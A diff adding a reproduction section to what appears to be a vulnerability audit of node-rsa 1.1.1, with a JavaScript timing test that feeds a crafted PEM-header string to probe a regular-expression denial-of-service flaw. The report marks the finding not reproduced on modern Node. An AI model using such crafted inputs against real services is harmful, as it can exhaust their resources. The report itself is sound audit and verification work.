@@ -153,4 +153,54 @@ No findings were fully rejected. All 20 raw findings were either confirmed (11) 
 
 ---
 
+---
+
+## Reproduction (validated 2026-06-19)
+
+**Lab reference:** `targets/labs/npm-node-rsa/`
+
+**Pinned version:** node-rsa 1.1.1
+
+### Steps
+
+1. **Install the package:**
+   ```bash
+   npm install node-rsa@1.1.1
+   ```
+
+2. **Run the ReDoS timing test** with exponentially increasing input sizes:
+   ```javascript
+   const NodeRSA = require('node-rsa');
+   for (const n of [100, 500, 1000, 2000, 4000, 8000]) {
+     const payload = '-----BEGIN ' + 'A'.repeat(n);
+     const start = performance.now();
+     try { new NodeRSA(payload); } catch(e) {}
+     console.log(`n=${n} (${payload.length} bytes) took ${(performance.now()-start).toFixed(1)} ms`);
+   }
+   ```
+
+3. **Check** whether execution time grows exponentially (indicating catastrophic backtracking).
+
+### Observed output (from `targets/labs/npm-node-rsa/results.txt`)
+
+```
+node-rsa PoC -- version: 1.1.1
+
+=== NR-01: ReDoS in PEM auto-detect ===
+  n=100 (135 bytes)  importKey() took 0.3 ms
+  n=500 (535 bytes)  importKey() took 0.1 ms
+  n=1000 (1035 bytes) importKey() took 0.0 ms
+  n=8000 (8035 bytes) importKey() took 0.1 ms
+
+  time growth ratio (largest/smallest): 0.2x
+  ReDoS signal: weak/none
+  >>> NR-01 NOT REPRODUCED on this Node version <<<
+```
+
+### Verdict
+
+**NOT REPRODUCED.** V8's linear-time regex optimization on modern Node.js (16+) prevents catastrophic backtracking. The vulnerable regex pattern exists in source but is mitigated at runtime. Exploitable on older Node.js versions or non-V8 engines.
+
+---
+
 **Pipeline:** 20 raw findings → 11 confirmed (1 HIGH breachable, 10 downgraded to LOW)
